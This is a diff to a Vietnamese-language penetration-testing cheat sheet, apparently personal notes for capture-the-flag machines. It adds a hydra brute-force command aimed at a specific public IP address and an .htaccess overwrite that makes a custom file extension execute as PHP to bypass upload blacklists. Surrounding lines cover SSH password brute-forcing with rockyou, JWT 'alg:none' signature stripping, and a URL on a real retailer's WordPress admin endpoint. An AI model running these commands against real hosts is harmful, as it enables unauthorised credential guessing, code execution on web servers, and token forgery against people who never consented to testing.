@@ -3,10 +3,13 @@
 	- sudo cmd
 	- as + /root/root.txt
 =======================================
+service ssh start
+
 
 [+] Tools:
 	- enum4linux -a <MACHINE IP>: kiếm username
 	- hydra -t 4 -l <username> -P <rockyou.txt directory> ssh://<MACHINE IP>: Kiếm password
+	- hydra -l admin -P passwd.txt -s 30669 -f 13.250.40.38 http-get /
 
 =======================================
 
@@ -152,4 +155,11 @@ https://www.circlek.com.vn/wp-admin/admin-ajax.php?action=load_detail_product&da
 
 [+] JWT:
 	- decode() thay vì verify()
-	- "alg":"none" (không hash bằng thuật toán nào cả) -> xóa signature nhưng để lại dấu . 
+	- "alg":"none" (không hash bằng thuật toán nào cả) -> xóa signature nhưng để lại dấu .
+
+=======================================
+
+[+] File Upload:
+	- Ghi đè file .htaccess thêm vào 
+	AddType application/x-httpd-php .l33t
+	-> các file có đuôi 133t sẽ chạy đc php > bypass blacklist
